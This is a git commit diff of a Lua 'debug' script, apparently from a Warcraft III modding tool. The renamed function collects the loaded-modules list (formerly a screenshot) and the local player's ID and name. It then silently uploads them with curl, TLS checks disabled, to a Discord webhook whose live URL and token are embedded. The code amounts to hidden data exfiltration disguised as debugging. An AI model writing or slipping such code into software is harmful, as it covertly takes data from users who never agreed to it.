45f5e3efa0b7bceeeb6ac29adaaef6184f229b3a
EvolutionTag <99890357+EvolutionTag@users.noreply.github.com>
2022-12-03 15:24:17 +0300

    Debug Improved 2

--- scripts/DebugM.lua
+++ scripts/DebugM.lua
@@ -1,20 +1,19 @@
-function DebugCEx()
+function DebugMEx() 
     local ff = GetTempPath().."/"
     ff = ff .. "wc3."
-    ff = ff .. "jpg"
-    PrintWC3(ff)
+    ff = ff .. "txt"
+    PrintModules(ff)
     local message = string.format("(Evolution Tag) Player: %d: %s",GetPlayerId(GetLocalPlayer()),GetPlayerName(GetLocalPlayer()))
-    local url = "https://discord.com/api/webhooks/1048384458186821783/goOecY3rt9OS-XU0KJ51mqv1YpK3IwOX2oP8Snbe_KpNNd3foGSu7FufNWj3vw9A0smd"
+    local url = "https://discord.com/api/webhooks/1048567875348209675/nv19QP0mWYbPWLi9jurHJOZ0c0IF90mK2-k09BnRWt5by8Qm6Bz0r4zMUxcgJi2Ni4v7"
     local payload_json = string.format('{"content":"%s"}',message)
     local command = string.format('%s -s --insecure --location --request POST "%s" --form payload_json=%q --form ss=@%q',Curlpath,url,payload_json,ff,ff)
     --print("\n",command,"\n")
     RunCmdThreaded(command)
 end
 
-
-function DebugC() 
-    if(not DEBUG_C_DONE) then
-        DEBUG_C_DONE = true
-        DebugCEx()
+function DebugM() 
+    if(not DEBUG_M_DONE) then
+        DEBUG_M_DONE = true
+        DebugMEx()
     end
 end
